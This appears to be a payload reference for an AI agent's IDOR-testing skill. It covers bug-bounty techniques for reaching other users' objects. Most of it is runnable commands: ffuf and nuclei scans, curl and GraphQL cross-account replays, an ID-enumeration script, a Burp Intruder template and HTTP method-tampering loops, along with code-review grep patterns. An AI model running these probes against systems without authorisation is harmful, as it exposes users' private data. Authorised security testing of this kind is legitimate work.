# IDOR — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Numeric -> id=1 -> id=2, id=0, id=-1, id=999999

- UUID/hash -> swap a known UUID from another account; try UUIDv1 timestamps.

- Encoded -> base64 decode/encode, hex, JWT sub, gid://app/Model/123

- Batch -> `{"ids":[1,2,3]}` or repeated `id=1&id=2`

- Nested -> `/users/1/orders/2` with user 1 but order 2



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 4× | `MembershipRequest::getMembership()` |

| 4× | `link()` |

| 3× | `victim@email.com` |

| 3× | `MembershipService::getMembership()` |

| 2× | `Move to > My Content` |

| 2× | `application%5Bid%5D` |

| 2× | `curl --request POST \ / --url 'https://gitlab.domain.com/api/v4/projects/<ATTACKID>/merge_requests/1/status_check_responses?sha=<SHA>&extern` |

| 2× | `/BugReport/Admin/Attachment/{id}` |

| 2× | `attacker@email.com` |

| 2× | `{attacker-email}` |

| 2× | `curl -X GET "http://localhost:8080/ocs/v2.php/apps/circles/link/r2gmJl8n5xKWecQaVYe1dP3h6nqIUDk/ovYvboLMBNGvRXSkqhgllIKo6T7fvZl" \ / -H "OCS` |

| 2× | `getMembership()` |

| 2× | `LocalController::link()` |

| 1× | `POST /reports/[TEST_REPORT_ID]/reference.json HTTP/2 / Host: hackerone.com / Cookie: [your session cookie] / Content-Type: application/json` |

| 1× | `/reports/{id}/reference.json` |

| 1× | `/reports/{report_id}/reference.json` |

| 1× | `https://app.crowdsignal.com/users/invite-user.php?id=(userid)&popup=1` |

| 1× | `<PUT_VICTIM_EMAIL_HERE>` |

| 1× | `exmaple: GET /api/v1/users/@hasn0xxxx` |

| 1× | `GET /attachments/938540538 HTTP/1.1 / X-Signal-Agent: OWA / Accept-Encoding: gzip, deflate / X-Client-Version: BCM Android/5.1 Model/generic` |



## Parameters observed



`id` · `type` · `action` · `message` · `userId` · `Password` · `aura.context` · `aura.pageURI` · `aura.token` · `file` · `domain` · `PID` · `RNo` · `time_range` · `accounts` · `passChange` · `__RequestVerificationToken` · `ConfirmPassword` · `export_columns` · `start`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_idor.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_idor.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_idor.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_idor.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Nuclei only finds exposed objects; the real work is cross-account replay with two identities.



```sh

nuclei -u https://target -tags idor,exposure \

       -severity low,medium,high,critical -rl 40 -o nuclei_idor.txt

nuclei -u https://target -t ~/nuclei-templates/http/exposures \

       -rl 40 -o nuclei_idor_exposures.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



**Basic IDOR test with curl (swap cookie/token):**

```bash

# Get User A's resource ID while authenticated as A

curl -s -H "Cookie: session=USER_A_SESSION" \

  https://target.com/api/v1/invoices/12345



# Replay with User B's session

curl -s -H "Cookie: session=USER_B_SESSION" \

  https://target.com/api/v1/invoices/12345



# Success = 200 OK with User A's data

```



**GraphQL IDOR test:**

```bash

curl -s -X POST https://target.com/graphql \

  -H "Authorization: Bearer USER_B_TOKEN" \

  -H "Content-Type: application/json" \

  -d '{"query":"{ billingDocument(id: \"USER_A_DOC_ID\") { id amount pdfUrl } }"}'

```



**Enumerate sequential IDs with ffuf:**

```bash

ffuf -u "https://target.com/api/v1/orders/FUZZ" \

  -w ids.txt \

  -H "Authorization: Bearer USER_B_TOKEN" \

  -mc 200 \

  -o idor_results.json

```



**Generate sequential ID wordlist:**

```python

# Generate IDs around a known value

known_id = 48291

with open("ids.txt", "w") as f:

    for i in range(known_id - 500, known_id + 500):

        f.write(str(i) + "\n")

```



**Burp Intruder payload for IDOR scanning:**

```

GET /api/messages/§12345§ HTTP/1.1

Host: target.com

Authorization: Bearer USER_B_TOKEN



# Mark §12345§ as injection point

# Use numeric sequential payload: 12000-13000

# Filter responses by length difference or status 200

```



**JavaScript scraping for leaked IDs:**

```bash

# Find IDs in JS bundles

curl -s https://target.com/static/app.js | grep -Eo '"id":"[a-f0-9-]{36}"' | sort -u



# Find object references in API responses

curl -s -H "Cookie: session=USER_A" \

  https://target.com/api/v1/dashboard | python3 -m json.tool | grep -i "_id"

```



**Grep patterns for source code review:**

```bash

# Missing authorization checks in common frameworks

grep -r "findById\|findOne\|getById" --include="*.js" .

grep -r "params\[:id\]\|params\['id'\]" --include="*.rb" .

grep -r "request\.args\.get\('id'\)" --include="*.py" .



# Look for direct ORM queries without user scoping

grep -r "Model\.find(params" --include="*.js" .

# vs secure pattern: Model.find({ id: params.id, userId: req.user.id })

```



**IDOR via HTTP method tampering:**

```bash

# Try undocumented methods

for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do

  echo "=== $method ==="

  curl -s -X $method \

    -H "Authorization: Bearer USER_B_TOKEN" \

    https://target.com/api/v1/users/USER_A_ID/profile

done

```



---
